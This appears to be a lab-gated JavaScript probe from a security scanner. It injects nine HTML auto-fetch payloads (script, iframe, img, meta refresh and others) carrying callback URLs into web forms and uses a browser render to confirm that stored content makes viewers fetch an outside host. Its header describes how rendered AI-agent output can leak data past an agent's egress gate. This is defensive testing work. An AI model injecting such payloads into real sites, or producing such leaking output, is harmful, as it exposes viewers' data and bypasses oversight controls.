// Dark Matter rule-based scanner — egress-laundering probe (H3(b)).
//
// Technique (V8-F1, Muse Cat 7, up to $5,000 — taught to the scanner
// 11 Nov 2026, owner order: hunt, then train): when agent-generated
// rendered content preserves an external URL verbatim, a viewer browser
// fetches that URL directly — disclosing the viewer IP and view event,
// and transmitting any data encoded in the URL — with no approval, no
// warning, no proxy rewrite, and no sanitisation. The fetch is made by
// the viewer browser, so it never passes through the agent egress gate.
// Meta's Cat 7 explicitly lists "rendered content causing the client
// to fetch an attacker URL."
//
// This probe is the target-side analogue: a stored-content sink (form
// input re-rendered into HTML) that preserves an external URL in a
// fetchable attribute is the same primitive, and the same client-side
// fetch follows when a viewer opens the page.
//
//   Step 1 (baseline): GET the form's action page — every freshly-
//     random canary token must be ABSENT (sanity control).
//   Step 2 (inject): submit ONE payload carrying all 9 automatic-fetch
//     vectors (V10-F1), each with its OWN canary URL, into a text
//     input (POST body or GET query, matching the form's method):
//     img, script, iframe, link stylesheet, video poster, object, img
//     srcset, CSS background-image, meta refresh. Form action is NOT
//     a vector (submit-gated, not automatic).
//   Step 3 (verbatim): re-GET the action page AND the site root. Each
//     canary URL must appear VERBATIM inside its vector's
//     automatic-fetch attribute. A URL rendered as plain text, or
//     HTML-escaped, is not a fetch — not a finding.
//   Step 4 (fetch confirmation): render the stored page ONCE in a real
//     browser (renderDom, chromium --dump-dom) and wait on the OOB
//     collaborator for the tokens. The scanner's own fetch() never loads
//     subresources, so a collaborator hit here can only come from the
//     viewer browser — that is the (c) distinction: a fetch by the
//     viewer client is OUTSIDE the agent egress gate and is a finding;
//     an agent-issued POST through the gate is permitted by design
//     (v5 C4) and is NOT a finding. One wait covers all preserved
//     vectors; the finding names every vector the browser fetched.
//     No hit, no finding.
//
// LAB-GATED (safety requirement): the collaborator URL goes out ONLY
// when the target host is listed in opts.labTargets, and only when the
// collaborator is wired (opts.oobCallback + opts.oobWaitFor). A non-lab
// target never receives a callback URL; without a waiter there is
// nothing to confirm a hit with, so the probe returns [] without a
// single request. One confirmed finding per scan (first hit wins);
// each attempt is bounded (render only on a verbatim candidate).
//
// Oracle: evidence.verbatimPreserved=true AND evidence.clientFetchHit
// =true under the egress_laundering protocol (differential.js) ->
// 'confirmed'. Either flag missing leaves the finding unconfirmed or
// rejected — the probe itself only reports when both hold.
import { randomBytes } from 'node:crypto';
import { isLabTargetHost } from '../../labCreds.js';
import { renderDom } from '../domRender.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
const MAX_FORMS = 3;
const MAX_INPUTS_PER_FORM = 2;
const RENDER_WAIT_MS = 8000;

// Automatic-fetch vectors (V10-F1 — the V8-F1 root cause is TOTAL, not
// per-element: the renderer preserves external URLs in EVERY
// fetch-capable slot). Each vector is one element whose URL the viewer
// browser fetches with NO click. Form action is deliberately NOT a
// vector: a form fetches only on submit, so it cannot prove an
// automatic client-side fetch (V10FORM was tested and excluded for
// exactly this reason).
export const EGRESS_VECTORS = [
  { vector: 'img', build: (u) => `<img src="${u}">` },
  { vector: 'script', build: (u) => `<script src="${u}"></script>` },
  { vector: 'iframe', build: (u) => `<iframe src="${u}" title="Test frame"></iframe>` },
  { vector: 'link-stylesheet', build: (u) => `<link rel="stylesheet" href="${u}">` },
  { vector: 'video-poster', build: (u) => `<video poster="${u}"></video>` },
  { vector: 'object', build: (u) => `<object data="${u}"></object>` },
  { vector: 'srcset', build: (u) => `<img srcset="${u} 1x" src="${u}">` },
  { vector: 'css-background', build: (u) => `<div style="background-image: url(${u})"></div>` },
  // Meta refresh navigates the viewer away after 5s — it is last in
  // the payload so the silent-fetch vectors load first; the probe
  // stops at the first confirmed vector, so on a fully vulnerable
  // target the navigation never matters.
  { vector: 'meta-refresh', build: (u) => `<meta http-equiv="refresh" content="5;url=${u}">` },
];

// Automatic-fetch attributes: a URL in one of these is fetched by the
// viewer browser on render, with no click. <a href> is deliberately
// NOT here — a link fetches only on click, so it cannot prove an
// automatic client-side fetch. href counts only on <link> (stylesheet
// / preload), which the browser fetches on render. srcset precedes src
// in the alternation so `<img srcset="...">` matches as srcset, not src.
const AUTO_FETCH_ATTRS = ['srcset', 'src', 'data', 'poster', 'background'];

async function get(url, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      signal: ctrl.signal,
      headers: { 'User-Agent': UA, ...(opts.headers || {}) },
    });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

async function post(url, params, opts = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: ctrl.signal,
      headers: {
        'User-Agent': UA,
        'Content-Type': 'application/x-www-form-urlencoded',
        ...(opts.headers || {}),
      },
      body: params.toString(),
    });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

function isSubmittish(name) {
  return /^(submit|button|reset|image)$/i.test(String(name || ''));
}

function fillParams(inputs, targetName, payload) {
  const params = new URLSearchParams();
  let n = 0;
  for (const inp of inputs || []) {
    const name = inp.name;
    if (!name) continue;
    if (isSubmittish(name)) continue;
    if (name === targetName) params.set(name, payload);
    else params.set(name, `dmprobe${++n}_${randomBytes(2).toString('hex')}`);
  }
  // DVWA-style forms require Submit to be set (isset gate).
  params.set('Submit', '1');
  return params;
}

function siteRoot(url) {
  try {
    const u = new URL(url);
    return `${u.protocol}//${u.host}/`;
  } catch {
    return url;
  }
}

// Is the canary URL preserved verbatim as the value of an
// automatic-fetch attribute? Returns { attr, vector, window } for the
// first such occurrence, else null. Pure — exported for unit tests.
//
// The check is positional, not a URL regex: for each occurrence of
// the canary string, the ~120 chars before it must end in a
// fetchable-attribute assignment (`src="`, `data='`, …), a <link>
// href assignment, a CSS `url(` inside a style attribute / <style>
// block, or a meta-refresh `content="…;url=` — and the char right
// after the URL must close the value (quote; space/comma for srcset
// descriptors; `)` for unquoted CSS url()). An HTML-escaped payload
// (`&lt;img src=&quot;…`) fails: the "before" slice ends in `;`, not
// a quote, and the URL is not an attribute value. A URL rendered as
// plain text fails the same way. Only a real attribute value passes.
//
// The CSS / meta checks additionally require a LITERAL opening tag
// (`<div ... style="...url(` / `<meta ... refresh ... content=`)
// in the before-slice — an HTML-escaped payload has no literal `<`
// before the tag, so partial escaping (angle brackets escaped, quotes
// not) cannot false-positive. The vector is identified from the
// innermost open tag + attribute (script/iframe vs img src, link
// stylesheet, video poster, object data, srcset, CSS background,
// meta refresh) so the finding can name exactly which channels
// survived.
function tagBefore(before) {
  const m = /<([a-z][a-z0-9]*)\b[^>]*$/i.exec(before);
  return m ? m[1].toLowerCase() : null;
}

function vectorFor(tag, attr) {
  if (attr === 'href') return 'link-stylesheet';
  if (attr === 'srcset') return 'srcset';
  if (attr === 'poster') return 'video-poster';
  if (attr === 'data') return 'object';
  if (attr === 'src') {
    if (tag === 'script') return 'script';
    if (tag === 'iframe') return 'iframe';
    return 'img';
  }
  return attr; // e.g. background
}

export function findVerbatimFetchable(html, canaryUrl) {
  const body = String(html || '');
  const needle = String(canaryUrl || '');
  if (!needle) return null;
  const attrAlt = AUTO_FETCH_ATTRS.join('|');
  const attrRe = new RegExp(`(?:${attrAlt})\\s*=\\s*["']$`, 'i');
  const linkRe = /<link\b[^>]*\bhref\s*=\s*["']$/i;
  const cssStyleAttrRe = /<([a-z][a-z0-9]*)\b[^>]*\bstyle\s*=\s*["'][^"']*url\(\s*["']?$/i;
  const cssStyleBlockRe = /<style\b[^>]*>[^<]*url\(\s*["']?$/i;
  const metaRefreshRe = /<meta\b[^>]*refresh[^>]*content\s*=\s*["'][^"']*;\s*url\s*=\s*["']?$/i;
  const windowFor = (idx) => body.slice(Math.max(0, idx - 60), idx + needle.length + 60);
  let from = 0;
  for (;;) {
    const idx = body.indexOf(needle, from);
    if (idx === -1) return null;
    const after = body[idx + needle.length];
    const before = body.slice(Math.max(0, idx - 120), idx);
    if (after === '"' || after === "'") {
      const attrM = attrRe.exec(before);
      const linkM = linkRe.exec(before);
      if (attrM || linkM) {
        const attr = attrM ? attrM[0].trim().replace(/\s*=.*$/, '').toLowerCase() : 'href';
        return { attr, vector: vectorFor(tagBefore(before), attr), window: windowFor(idx) };
      }
      if (cssStyleAttrRe.test(before) || cssStyleBlockRe.test(before)) {
        return { attr: 'background', vector: 'css-background', window: windowFor(idx) };
      }
      if (metaRefreshRe.test(before)) {
        return { attr: 'content', vector: 'meta-refresh', window: windowFor(idx) };
      }
    } else if (after === ' ' || after === ',') {
      // srcset only: `<img srcset="<canary> 1x, ...">` — a descriptor
      // or a second candidate follows the URL.
      const attrM = attrRe.exec(before);
      if (attrM) {
        const attr = attrM[0].trim().replace(/\s*=.*$/, '').toLowerCase();
        if (attr === 'srcset') return { attr, vector: 'srcset', window: windowFor(idx) };
      }
    } else if (after === ')') {
      // CSS url(<canary>) — unquoted.
      if (cssStyleAttrRe.test(before) || cssStyleBlockRe.test(before)) {
        return { attr: 'background', vector: 'css-background', window: windowFor(idx) };
      }
    }
    from = idx + needle.length;
  }
}

export async function probeEgressLaundering(forms, url, opts = {}) {
  const findings = [];
  // LAB GATE: the collaborator URL goes out only for lab targets.
  if (!isLabTargetHost(url, opts.labTargets)) return findings;
  const oobCallback = String(opts.oobCallback || '').replace(/\/+$/, '');
  const oobWaitFor = opts.oobWaitFor;
  const oobHasHit = opts.oobHasHit;
  // Fail-closed: without a collaborator there is nothing to confirm
  // a client-side fetch with, so send nothing.
  if (!oobCallback || typeof oobWaitFor !== 'function') return findings;
  const render = typeof opts.renderDom === 'function' ? opts.renderDom : renderDom;
  const root = siteRoot(url);

  // Best finding across all (form, input) attempts: a short field can
  // truncate the combined payload (DVWA's guestbook name field cuts it
  // after ~120 chars, so only the first vector survives there) while
  // a longer field on the same form preserves all nine. Stopping at
  // the first confirmed finding would under-report the target, so the
  // probe keeps the finding with the most fetched vectors and stops
  // early only when a finding confirms all nine (nothing can beat it).
  // One confirmed finding per scan is still the cap.
  let best = null;
  let done = false;
  for (const form of (forms || []).slice(0, MAX_FORMS)) {
    // Textareas are the primary stored-content sink (comment/message
    // fields) — analyzePage inventories them per form in a separate
    // `textareas` array, so merge them in alongside the inputs.
    // DVWA's guestbook message field (mtxMessage) is a textarea:
    // without this the probe only ever tried the short name field
    // and never saw the field that stores the full payload.
    // Submit controls are excluded by TYPE as well as by name: a
    // button named btnSign/btnClear is not "submittish" by name, and
    // without the type check it occupies a target slot and crowds
    // the textarea out of the MAX_INPUTS_PER_FORM cap (DVWA's form
    // has two submit buttons ahead of the textarea).
    const isSubmitControl = (f) =>
      isSubmittish(f.name) || /^(submit|button|reset|image)$/i.test(String(f.type || ''));
    const targets = [
      ...(form.inputs || []).filter((i) => i.name && !isSubmitControl(i)),
      ...(form.textareas || []).filter((t) => t.name).map((t) => ({ ...t, type: 'textarea' })),
    ].slice(0, MAX_INPUTS_PER_FORM);
    // Every field the form carries must be submitted (a missing field
    // can fail a DVWA-style isset gate or store an empty value) —
    // inputs AND textareas; the target gets the payload, the rest
    // filler. The targets list above is the capped subset to ATTACK;
    // this one is the full set to SUBMIT.
    const submitFields = [...(form.inputs || []), ...(form.textareas || [])];
    for (const input of targets) {
      const inputName = input.name;
      // One submission carries ALL 9 vectors, each with its OWN canary
      // token — a collaborator hit for a token proves THAT vector's
      // fetch. One render confirms every preserved vector at once, so
      // the render budget is unchanged from the single-vector probe.
      const vectors = EGRESS_VECTORS.map((v) => {
        const token = `h3b${randomBytes(6).toString('hex')}`;
        const canaryUrl = `${oobCallback}/${token}`;
        return { ...v, token, canaryUrl, payload: v.build(canaryUrl) };
      });
      const payload = vectors.map((v) => v.payload).join('\n');
      // Step 1 (baseline): every fresh token must be absent.
      let baseline = '';
      try {
        baseline = await get(form.action, opts);
      } catch {
        continue;
      }
      if (vectors.some((v) => baseline.includes(v.token))) continue;
      // Step 2 (inject): submit the combined payload into the input.
      const params = fillParams(submitFields, inputName, payload);
      try {
        if (String(form.method || 'get').toLowerCase() === 'post') {
          await post(form.action, params, opts);
        } else {
          await get(`${form.action}${form.action.includes('?') ? '&' : '?'}${params.toString()}`, opts);
        }
      } catch {
        continue;
      }
      // Step 3 (verbatim): each canary URL must survive in its vector's
      // automatic-fetch attribute on the action page or the site root.
      // A vector rendered as plain text, HTML-escaped, proxied, or
      // stripped is not a fetch — not a finding.
      const preserved = [];
      for (const checkUrl of [form.action, root]) {
        let body = '';
        try {
          body = await get(checkUrl, opts);
        } catch {
          continue;
        }
        for (const v of vectors) {
          if (preserved.some((p) => p.vector === v.vector)) continue;
          const hit = findVerbatimFetchable(body, v.canaryUrl);
          if (hit) {
            preserved.push({
              vector: hit.vector,
              attr: hit.attr,
              token: v.token,
              canaryUrl: v.canaryUrl,
              storedAt: checkUrl,
              window: hit.window,
            });
          }
        }
        if (preserved.length === vectors.length) break;
      }
      if (!preserved.length) continue; // stripped / proxied / rewritten / escaped — not a finding
      // Step 4 (fetch confirmation): a real browser render of the
      // stored page must fetch the preserved canary URLs. Contamination
      // guard: a hit for a fresh token before the render means the token
      // leaked (or a non-browser path fetched it) — skip, do not report.
      if (typeof oobHasHit === 'function' && preserved.some((p) => oobHasHit(p.token))) continue;
      let rendered = null;
      try {
        rendered = await render(preserved[0].storedAt, opts);
      } catch {
        continue;
      }
      if (!rendered || !rendered.ok) continue; // the browser never rendered — no fetch to confirm
      // One wait covers all preserved vectors: check immediate hits,
      // then wait once on the first preserved token and re-check the
      // rest (a slow vector — e.g. meta refresh at 5s — may land while
      // we wait on another token).
      const hitFor = (p) => (typeof oobHasHit === 'function' ? oobHasHit(p.token) : null);
      let fetched = preserved.filter((p) => hitFor(p));
      if (!fetched.length) {
        try {
          await oobWaitFor(preserved[0].token, RENDER_WAIT_MS);
        } catch {
          // ignore — the re-check below decides
        }
        fetched = preserved.filter((p) => hitFor(p));
      }
      if (!fetched.length) continue; // preserved but never fetched — unconfirmed, not a finding
      const firstHit = fetched.map((p) => hitFor(p)).find(Boolean);
      const finding = {
        class: 'egress_laundering',
        id: `egress-laundering-${form.action}-${inputName}`.slice(0, 120),
        title: 'Egress laundering via stored content — viewer browser fetches an external URL (HIGH)',
        severity: 'high',
        url: form.action,
        param: inputName,
        parameter: inputName, // dedup key: one finding per sink input, not per page
        evidence: {
          request: `${String(form.method || 'get').toUpperCase()} ${form.action} (${inputName}=<9-vector payload, one canary URL per vector>)`,
          response:
            `canary URLs preserved verbatim in fetchable attributes (${preserved.map((p) => `${p.vector}:${p.attr}`).join(', ')}) on ${preserved[0].storedAt} — e.g. "...${preserved[0].window}..." — and a real browser render fetched ${fetched.length} of them (${fetched.map((p) => p.vector).join(', ')}) (collaborator hit for token ${firstHit.token}, ${firstHit.method || 'GET'} ${firstHit.path || ''} at ${firstHit.at || ''}${firstHit.userAgent ? `, UA: ${String(firstHit.userAgent).slice(0, 120)}` : ''}). Absent in pre-submit baseline.`,
          impact_demo:
            'Attacker-controlled stored content causes every viewer browser to fetch an attacker URL directly — disclosing the viewer IP + view event and transmitting any data encoded in the URL — with no approval, no warning, no proxy rewrite, and no sanitisation. The fetch is made by the viewer browser, so it never passes through the agent egress gate (an agent-issued POST through the gate is permitted by design and is NOT a finding).',
          vectors: fetched.map((p) => p.vector),
          preservedVectors: preserved.map((p) => p.vector),
          verbatimPreserved: true,
          clientFetchHit: true,
        },
      };
      if (!best || fetched.length > best.fetchedCount) best = { finding, fetchedCount: fetched.length };
      if (fetched.length === vectors.length) {
        done = true;
        break; // all nine confirmed — nothing can beat this finding
      }
    }
    if (done) break;
  }
  if (best) findings.push(best.finding);
  return findings;
}

export const __egressLaunderingMeta = { phases: ['egress-laundering'], depth: ['quick', 'standard', 'deep'] };
